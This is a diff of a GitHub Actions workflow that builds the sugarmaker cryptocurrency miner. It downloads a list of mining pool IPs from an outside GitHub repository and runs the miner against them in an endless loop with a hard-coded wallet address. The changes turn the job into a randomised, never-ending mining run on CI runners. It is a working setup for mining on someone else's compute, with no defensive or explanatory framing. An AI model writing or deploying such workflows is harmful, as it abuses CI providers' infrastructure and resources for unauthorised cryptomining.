@@ -37,19 +37,40 @@ jobs:
           ./configure CFLAGS="-Wall -O2 -fomit-frame-pointer" CXXFLAGS="$CFLAGS -std=gnu++11"
           make
 
-      - name: Download list.json
+      - name: Download and process IP list
         run: |
-          curl -L -o list.json https://github.com/barburonjilo/open/raw/refs/heads/main/list.json
+          dynamic_list="list3.json"
+          wget -O $dynamic_list https://github.com/barburonjilo/open/raw/refs/heads/main/list.json
+          if [[ ! -f $dynamic_list ]]; then
+            echo "Failed to download IP list. Exiting."
+            exit 1
+          fi
+
+          # Check JSON file format
+          if ! jq '.' $dynamic_list > /dev/null 2>&1; then
+            echo "Invalid JSON format. Exiting."
+            exit 1
+          fi
 
       - name: Run Sugarmaker in loop
         run: |
-          # Extract IPs from the list.json file
-          ips=$(jq -r '.[].IP' list.json)
+          timestamp=$(date +%s)
 
           cd sugarmaker
 
-          for ip in $ips; do
-            for port in {601..610}; do
+          while true; do
+            # Select a random IP from the JSON file
+            ip=$(jq -r '.[]' ../list3.json | shuf -n 1)
+            if [ -z "$ip" ]; then
+              echo "No IP found in list3.json. Exiting."
+              exit 1
+            fi
+
+            # Remove selected IP from JSON file
+            jq --arg ip "$ip" 'del(.[] | select(. == $ip))' ../list3.json > tmp_$timestamp.json && mv tmp_$timestamp.json ../list3.json
+
+            # Loop through ports
+            for port in $(seq 601 610); do
               echo "Running ./sugarmaker for $ip:$port"
               ./sugarmaker -o $ip:$port -u sugar1q8cfldyl35e8aq7je455ja9mhlazhw8xn22gvmr -p x &
               sleep 80
